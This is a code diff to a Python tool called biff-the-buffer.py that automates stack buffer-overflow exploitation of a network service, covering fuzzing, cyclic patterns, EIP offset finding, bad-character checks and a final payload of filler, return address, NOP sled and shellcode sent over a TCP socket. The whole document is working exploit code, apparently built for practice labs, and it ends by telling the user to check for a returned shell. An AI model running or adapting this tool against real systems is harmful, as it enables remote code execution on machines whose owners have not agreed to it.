@@ -38,16 +38,34 @@ def main():
   start = str.encode(start)
   end = str.encode(end)
 
-  # Helper function
+  # Helper functions
   def socket_send(payload, print_before="", print_after=""):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
       s.settimeout(timeout)
       s.connect((ip, port))
       s.recv(1024)
-      print(print_before)
+      if (len(print_before) > 0): print(print_before)
       s.send(payload)
       s.recv(1024)
-      print(print_after)
+      if (len(print_after) > 0): print(print_after)
+
+  def print_next_posssible_command():
+    print('[*] Possible next command:')
+    script = f'    ./biff-the-buffer.py -i {ip} -p {port} -s "{start.decode("utf-8")}" -e "{end.decode("utf-8")}"'
+
+    # Determine which action was used
+    if (action == 'fuzz'):
+      script += f' -a pattern -l {length}'
+    elif (action == 'pattern'):
+      script += ' -a offset -q "value_of_eip"'
+    elif (action == 'offset'):
+      script += f' -a verify -o {offset.decode("utf-8")}'
+    elif (action == 'verify'):
+      script += f' -a chars -o {offset.decode("utf-8")} -x "<bytes_to_exclude>"'
+    elif (action == 'chars'):
+      script += f' -a exploit -c /path/to/shellcode -r "new_eip"'
+
+    print(script)
 
   # Create string to send to app
   if action == 'fuzz':
@@ -56,11 +74,14 @@ def main():
 
     while True:
       num_bytes = 100 * inc
-      string = start + "A" * num_bytes + end
+      string = start + b"A" * num_bytes + end
+      current_length = (len(string) - len(start))
       try:
-        socket_send(string, f"[*] Fuzzing with {(len(string) - len(start))} bytes")
+        socket_send(string, f"[*] Fuzzing with {current_length} bytes")
       except:
-        print(f"[*] Fuzzing crashed at {(len(string) - len(start))} bytes")
+        print(f"[*] Fuzzing crashed at {current_length} bytes")
+        length = current_length
+        print_next_posssible_command()
         sys.exit(0)
       inc += 1
       time.sleep(1)
@@ -69,16 +90,18 @@ def main():
     if (length is None): raise Exception("[X] Must supply a length if using pattern")
     pattern = create_pattern(length)
     string = start + pattern + end
-    socket_send(string, f"[*] Sending pattern of size {length}", "[*] Patern sent")
+    try:
+      socket_send(string, f"[*] Sending pattern of size {length}", "[*] Patern sent")
+    except:
+      print_next_posssible_command()
   
   elif action == 'chars':
     if (offset is None): raise Exception("[X] Must supply an offset if using chars")
     try:
       all_chars = get_all_bytes(excluded_bytes=bytes.fromhex(exclude))
-      filler_chars = offset - (len(start) + len(end))
       payload = [
         start,
-        b'A' * (filler_chars),
+        b'A' * (offset),
         end,
         b'B' * (4),
         all_chars
@@ -87,13 +110,16 @@ def main():
       socket_send(payload, f"[*] Sending all possible bytes (length={len(payload)} bytes)", "[*] All possible bytes sent")
     except:
       print("[*] Check your debugger for a crash")
+      print_next_posssible_command()
 
   elif action == 'offset':
     if (query is None): raise Exception("[X] Must supply a query if using offset")
     print(f"[*] Finding offset of the query {query}")
     query = query.strip()
     result = determine_offset(query)
-    print(result.decode("utf-8"))
+    offset = result[26:]
+    print(result.decode("utf-8").strip())
+    print_next_posssible_command()
 
   elif action == 'verify':
     if (offset is None): raise Exception("[X] Must supply an offset if using verify")
@@ -116,6 +142,7 @@ def main():
       print("[*] Remember, you may need to add to registers to skip over the start value if provided")
       if (len(start) > 0):
         print(f'[*] In this case you may need "add <register>,{len(start)}"')
+      print_next_posssible_command()
 
   elif action == 'exploit':
     if (offset is None): raise Exception("[X] Must supply the offset if using exploit")
@@ -140,16 +167,25 @@ def main():
         shellcode_string += byte_in_file
         byte_in_file = shellcode.read(1)
 
+    # shellcode_string = bytearray(shellcode_string)
+    # shellcode_string.reverse()
+    # shellcode_string = bytes(shellcode_string)
+
     # Build the payload
     print("[*] Building full payload")
     payload = [
       start,
-      b'\x90' * (offset)),
-      shellcode_string,
-      eip
+      b'A' * (offset),
+      end,
+      eip,
+      b'\x90' * 16,
+      shellcode_string
     ]
     payload = b"".join(payload)
-    socket_send(payload, "[*] Sending shellcode")
+    try:
+      socket_send(payload, "[*] Sending shellcode")
+    except:
+      print('[*] Check for a shell being returned')
 
 
 def system_call(command, timeout=0):
